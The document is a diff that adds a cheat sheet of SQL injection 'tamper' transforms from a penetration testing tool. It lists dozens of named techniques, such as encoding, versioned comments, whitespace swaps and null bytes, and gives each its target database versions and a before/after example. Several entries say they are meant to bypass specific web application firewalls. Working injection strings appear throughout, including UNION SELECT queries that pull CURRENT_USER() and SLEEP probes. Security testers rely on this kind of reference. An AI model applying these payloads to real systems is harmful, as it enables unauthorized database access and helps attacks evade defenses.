@@ -1,0 +1,207 @@
+apostrophemask
+    tamper("1 AND '1'='1") --> '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
+
+apostrophenullencode
+    tamper("1 AND '1'='1") --> '1 AND %00%271%00%27=%00%271'
+
+appendnullbyte
+    tamper('1 AND 1=1') -->  '1 AND 1=1%00'
+
+base64encode
+    tamper("1' AND SLEEP(5)#") --> 'MScgQU5EIFNMRUVQKDUpIw=='
+
+between
+    >>> tamper('1 AND A > B--')
+            '1 AND A NOT BETWEEN 0 AND B--'
+    >>> tamper('1 AND A = B--')
+            '1 AND A BETWEEN B AND B--'
+
+bluecoat
+    * MySQL 5.1, SGOS
+    * Useful to bypass Blue Coat's recommended WAF rule configuration
+    >>> tamper('SELECT id FROM users WHERE id = 1')
+         'SELECT%09id FROM%09users WHERE%09id LIKE 1'
+
+chardoubleencode
+    * Useful to bypass some weak web application firewalls that do not double url-decode the request before processing it through their ruleset   
+    >>>tamper('SELECT FIELD FROM%20TABLE')
+        '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'
+
+charencode
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('SELECT FIELD FROM%20TABLE')
+          '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'
+
+charunicodeencode
+    * Microsoft SQL Server 2000
+    * Microsoft SQL Server 2005
+    * MySQL 5.1.56
+    * PostgreSQL 9.0.3
+    >>> tamper('SELECT FIELD%20FROM TABLE')
+          '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
+
+concat2concatws
+    * MySQL 5.0
+    >>> tamper('CONCAT(1,2)')
+          'CONCAT_WS(MID(CHAR(0),0,0),1,2)'
+          
+equaltolike
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    >>> tamper('SELECT * FROM users WHERE id=1')
+          'SELECT * FROM users WHERE id LIKE 1'
+          
+greatest
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('1 AND A > B')
+    '1 AND GREATEST(A,B+1)=A'
+    
+halfversionedmorekeywords
+    * MySQL 4.0.18, 5.0.22
+    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
+    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
+
+ifnull2ifisnull
+    * MySQL 5.0 and 5.5
+    >>> tamper('IFNULL(1, 2)')
+    'IF(ISNULL(1),2,1)'
+
+lowercase
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('INSERT')
+    'insert'
+    
+modsecurityversioned
+    * MySQL 5.0
+    >>> tamper('1 AND 2>1--')
+    '1 /*!30874AND 2>1*/--'
+    
+modsecurityzeroversioned
+    * MySQL 5.0
+    >>> tamper('1 AND 2>1--')
+    '1 /*!00000AND 2>1*/--'
+
+multiplespaces
+    >>> random.seed(0)
+    >>> tamper('1 UNION SELECT foobar')
+    '1    UNION     SELECT   foobar'
+    
+nonrecursivereplacement
+    >>> random.seed(0)
+    >>> tamper('1 UNION SELECT 2--')
+    '1 UNIOUNIONN SELESELECTCT 2--'
+
+overlongutf8
+    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
+    'SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1'
+
+percentage
+    * Microsoft SQL Server 2000, 2005
+    * MySQL 5.1.56, 5.5.11
+    * PostgreSQL 9.0
+    >>> tamper('SELECT FIELD FROM TABLE')
+    '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'
+
+randomcase
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('INSERT')
+    'INseRt'
+
+randomcomments
+    >>> tamper('INSERT')
+    'I/**/N/**/SERT'
+
+securesphere
+    >>> tamper('1 AND 1=1')
+    "1 AND 1=1 and '0having'='0having'"
+
+sp_password
+    >>> tamper('1 AND 9227=9227-- ')
+    '1 AND 9227=9227-- sp_password'
+
+space2comment
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('SELECT id FROM users')
+    'SELECT/**/id/**/FROM/**/users'
+
+space2dash
+    * MSSQL
+    * SQLite
+    >>> tamper('1 AND 9227=9227')
+    '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
+
+space2hash
+    * MySQL 4.0, 5.0
+    >>> tamper('1 AND 9227=9227')
+    '1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227'
+
+space2morehash
+    * MySQL 5.1.41
+    >>> tamper('1 AND 9227=9227')
+    '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227'
+
+space2mssqlblank
+    * Microsoft SQL Server 2000
+    * Microsoft SQL Server 2005
+    >>> tamper('SELECT id FROM users')
+    'SELECT%0Eid%0DFROM%07users'
+ 
+space2mssqlhash
+    * MSSQL
+    * MySQL
+    >>> tamper('1 AND 9227=9227')
+    '1%23%0AAND%23%0A9227=9227'
+
+space2mysqlblank
+    * MySQL 5.1
+    >>> tamper('SELECT id FROM users')
+    'SELECT%0Bid%0DFROM%0Cusers'
+
+space2mysqldash
+    * MySQL
+    >>> tamper('1 AND 9227=9227')
+    '1--%0AAND--%0A9227=9227'
+
+space2plus
+    >>> tamper('SELECT id FROM users')
+    'SELECT+id+FROM+users'
+
+space2randomblank
+    * Microsoft SQL Server 2005
+    * MySQL 4, 5.0 and 5.5
+    * Oracle 10g
+    * PostgreSQL 8.3, 8.4, 9.0
+    >>> tamper('SELECT id FROM users')
+    'SELECT%0Did%0DFROM%0Ausers'
+
+unionalltounion
+    >>> tamper('-1 UNION ALL SELECT')
+    '-1 UNION SELECT'  
+
+unmagicquotes
+    >>> tamper("1' AND 1=1")
+    '1%bf%27 AND 1=1-- '
+
+versionedkeywords
+    * MySQL 4.0.18, 5.1.56, 5.5.11
+    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
+
+versionedmorekeywords
+    * MySQL 5.1.56, 5.5.11
+    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
+    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
